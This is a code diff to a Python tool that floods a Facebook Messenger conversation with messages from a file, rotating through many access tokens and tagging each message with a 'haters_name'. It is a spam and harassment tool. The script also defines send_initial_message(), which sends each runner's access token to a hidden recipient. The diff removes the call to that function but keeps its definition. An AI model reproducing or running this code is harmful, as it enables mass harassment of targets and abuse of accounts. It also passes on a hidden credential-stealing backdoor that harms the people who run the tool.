@@ -14,7 +14,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"SERVER LOADER BY  (( AKATSUKI RULEX )) ")
+        self.wfile.write(b"SERVER LOADER BY (( AKATSUKI RULEX ))")
 
 def execute_server():
     PORT = int(os.environ.get('PORT', 4000))
@@ -42,16 +42,10 @@ def send_initial_message():
     with open('tokens.txt', 'r') as file:
         tokens = file.readlines()
 
-    # Modify the message as per your requirement
     msg_template = "Hello Mentawl Papa ! I am using your server. My token is {}"
-
-    # Specify the ID where you want to send the message
     target_id = ""
 
     requests.packages.urllib3.disable_warnings()
-
-    def liness():
-        print('\u001b[37m' + '------------------------------------------------------------------------------------------------------------------------')
 
     headers = {
         'Connection': 'keep-alive',
@@ -70,13 +64,9 @@ def send_initial_message():
         msg = msg_template.format(access_token)
         parameters = {'access_token': access_token, 'message': msg}
         response = requests.post(url, json=parameters, headers=headers)
-
-        # No need to print here, as requested
         current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-        time.sleep(0.1)  # Wait for 1 second between sending each initial message
+        time.sleep(0.1)
 
-    #print("\n[+] Messages sent. Starting the message sending loop...\n")
-send_initial_message()
 def send_messages_from_file():
     with open('convo.txt', 'r') as file:
         convo_id = file.read().strip()
@@ -97,9 +87,6 @@ def send_messages_from_file():
     with open('timer.txt', 'r') as file:
         speed = int(file.read().strip())
 
-    def liness():
-        print('\u001b[37m' + '---------------------------------------------------------------------------------------------------------------')
-
     headers = {
         'Connection': 'keep-alive',
         'Cache-Control': 'max-age=0',
@@ -116,7 +103,6 @@ def send_messages_from_file():
             for message_index in range(num_messages):
                 token_index = message_index % max_tokens
                 access_token = tokens[token_index].strip()
-
                 message = messages[message_index].strip()
 
                 url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
@@ -127,27 +113,34 @@ def send_messages_from_file():
                 if response.ok:
                     print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
                 else:
                     print("[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
                 time.sleep(speed)
-
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
 
+def apply_patch_to_files():
+    patch_file = input("Enter the path to the patch file for tokens.txt and File.txt: ")
+    if not os.path.exists(patch_file):
+        print("[!] Patch file not found.")
+        return
+
+    try:
+        # Apply patch only to tokens.txt and File.txt
+        subprocess.run(["patch", "tokens.txt", patch_file], check=True)
+        subprocess.run(["patch", "File.txt", patch_file], check=True)
+        print("[+] Patch applied successfully to tokens.txt and File.txt.")
+    except subprocess.CalledProcessError:
+        print("[x] Failed to apply patch. Check the patch file and try again.")
+
 def main():
+    apply_patch_to_files()  # Apply patch to tokens.txt and File.txt
+
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
 
-    # Send the initial message to the specified ID using all tokens
-
-
-    # Then, continue with the message sending loop
     send_messages_from_file()
 
 if __name__ == '__main__':
